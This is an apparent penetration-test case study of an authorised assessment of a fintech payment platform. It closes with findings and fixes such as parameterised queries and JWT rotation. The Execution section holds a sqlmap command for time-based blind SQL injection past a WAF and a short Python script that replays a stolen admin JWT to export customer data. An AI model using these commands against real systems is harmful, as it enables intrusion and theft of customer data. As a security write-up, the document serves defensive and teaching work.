01.

Overview

Background. A mid-size fintech provider engaged me to assess the external perimeter of a customer-facing platform handling payment workflows. The estate consisted of a public web application, three staging servers, and a corporate VPN endpoint feeding into a segmented internal network.

Target. Prove whether an unauthenticated attacker on the internet could move from initial access to sensitive customer data within a four-week window, without disrupting production services — and hand the engineering team fixes that actually ship.

The engagement was scoped under OWASP Testing Guide v4.2 and PTES, with rules of engagement covering active exploitation, denial-of-service-free fuzzing, and out-of-hours testing for high-risk payloads.

02.

The Challenge

The application sat behind a managed WAF with a tuned rule set, and all obvious injection points returned clean blocks. Two constraints made the engagement genuinely difficult:

  • Blind surface. The vulnerable endpoint returned identical responses regardless of payload — no error-based or boolean-based signals, forcing a time-based approach over a high-latency connection.
  • Constrained egress. The web server could only reach a single internal jump host on port 8443, so classic reverse shells from the application tier were dead on arrival.
  • Noisy telemetry. The client's SOC was watching the engagement in real time, so every technique had to be paced to distinguish detection gaps from expected alerts.
03.

The Execution

Methodology

Testing followed the OWASP WSTG flow: reconnaissance → mapping → vulnerability analysis → exploitation → post-exploitation → reporting. Each finding was re-tested from a clean session to guarantee reproducibility.

Step 1 — Reconnaissance

Full TCP sweep plus version detection surfaced an overlooked staging host exposing an admin panel and an SMB service inherited from a base VM image.

Step 2 — Injection under the WAF

The WAF blocked string matching on keywords, but it did not normalize JSON unicode escapes before the backend parsed them. Encoding the payload body allowed time-based blind SQLi against the /api/invoices endpoint:

terminal — sqlmap 
$ sqlmap -u "https://target/api/invoices?id=1" \
        --data='{"id":"1"}' --headers="Content-Type: application/json" \
        --techn=T --dbms=postgresql --level=3 --risk=2 --batch
# WAF detected: generic (delay-based filtering)
# custom tamper: unicode-escape applied
[+] parameter 'id' is vulnerable (time-based blind)
[+] database management system: PostgreSQL 15.3
[+] retrieved 4 tables: users, cards, sessions, audit_log

Step 3 — Exploitation (PoC)

Dumping the sessions table yielded a valid admin JWT. Replay against the Node admin panel escalated privileges without touching the WAF rules:

poc.py — privilege escalation 
#!/usr/bin/env python3
"""Replay stolen admin session - PoC for client review only."""
import requests

STOLEN_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
r = requests.get(
    "https://target:8443/admin/export",
    headers={"Authorization": f"Bearer {STOLEN_JWT}"},
    verify=False,
)
print(r.status_code, len(r.content))
# 200 OK - full customer export downloaded (redacted in report)

Step 4 — Internal pivot

From the admin export service, SSRF in the invoice-render endpoint reached the internal jump host on 8443, chaining external injection into lateral movement against the declared crown-jewel segment.

04.

The Impact & Mitigation

Results. In fourteen testing days the engagement produced 12 findings — two critical, three high, five medium and two low — including a full chain from unauthenticated internet access to customer-data export.

ID Finding Vector Severity
F-01 Time-based blind SQLi behind WAF API / JSON unicode Critical
F-02 Stolen admin JWT replay (no rotation) Session mgmt Critical
F-03 SSRF to internal jump host Invoice renderer High
F-04 Out-of-scope staging host with Samba Asset drift High

Recommendations

  1. Parameterized queries everywhere — replace string-built SQL in the invoice module and add integration tests that fail on concatenation patterns.
  2. Normalize before inspect — decode JSON unicode and enforce a strict WAF policy so encoded payloads are matched pre-parse.
  3. Short-lived sessions — 15-minute JWT TTL with refresh rotation and server-side revocation on privilege change.
  4. Least-privilege egress — block app-tier access to internal segments except an explicit allow-list; disable SSRF-prone URL fetching.
  5. Asset inventory — continuous discovery so staging machines cannot drift outside the scanned perimeter.

Re-testing after remediation closed both critical findings, and the detection rules written during the engagement now run in production as part of the SOC's baseline.
